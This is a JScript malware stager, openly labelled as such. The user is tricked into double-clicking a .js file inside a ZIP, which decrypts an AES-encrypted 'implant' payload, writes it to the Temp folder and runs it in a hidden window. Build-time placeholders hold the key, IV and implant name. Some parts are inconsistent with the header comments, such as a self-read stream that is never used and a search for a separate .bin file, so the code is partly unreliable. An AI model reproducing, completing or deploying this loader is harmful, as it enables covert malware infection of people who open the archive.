// ZIP-embedded JScript stager
// Reads encrypted implant payload smuggled after the ZIP central directory,
// decrypts with AES-256-CBC via .NET interop, writes to %TEMP%, executes.
// Replaces the stager .exe in the ZIP — user double-clicks the .js instead.
//
// Template variables (replaced at build time):
//   {{KEY_B64}}   — AES-256 key, base64
//   {{IV_B64}}    — AES IV, base64
//   {{FILENAME}}  — implant filename written to disk
//   {{MAGIC}}     — payload marker bytes (default: THORNPLD)

var fso   = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");

var selfPath = WScript.ScriptFullName;
var tmp      = shell.ExpandEnvironmentStrings("%TEMP%") + "\\{{FILENAME}}";

var reader = new ActiveXObject("ADODB.Stream");
reader.Type = 1;
reader.Open();
reader.LoadFromFile(selfPath);

var zipDir = fso.GetParentFolderName(selfPath);
var files  = fso.GetFolder(zipDir).Files;
var payloadFile = null;

var e = new Enumerator(files);
for (; !e.atEnd(); e.moveNext()) {
    var f = e.item();
    if (fso.GetExtensionName(f.Name).toLowerCase() === "bin") {
        payloadFile = f.Path;
        break;
    }
}

if (payloadFile) {
    var pStream = new ActiveXObject("ADODB.Stream");
    pStream.Type = 1;
    pStream.Open();
    pStream.LoadFromFile(payloadFile);
    var encBytes = pStream.Read();
    pStream.Close();

    // Decrypt via .NET System.Security.Cryptography
    var aes = dotnet("System.Security.Cryptography.AesCryptoServiceProvider");
    aes.KeySize   = 256;
    aes.BlockSize = 128;
    aes.Mode      = 1; // CBC
    aes.Padding   = 2; // PKCS7
    aes.Key       = dotnetBase64Decode("{{KEY_B64}}");
    aes.IV        = dotnetBase64Decode("{{IV_B64}}");

    var decryptor = aes.CreateDecryptor();
    var plain     = decryptor.TransformFinalBlock(encBytes, 0, encBytes.length);

    var outStream = new ActiveXObject("ADODB.Stream");
    outStream.Type = 1;
    outStream.Open();
    outStream.Write(plain);
    outStream.SaveToFile(tmp, 2);
    outStream.Close();

    shell.Run(tmp, 0, false);
}

function dotnet(typeName) {
    return new ActiveXObject("System.Activator").CreateInstance(typeName);
}

function dotnetBase64Decode(b64) {
    var xml  = new ActiveXObject("MSXML2.DOMDocument.3.0");
    var node = xml.createElement("tmp");
    node.dataType = "bin.base64";
    node.text     = b64;
    return node.nodeTypedValue;
}
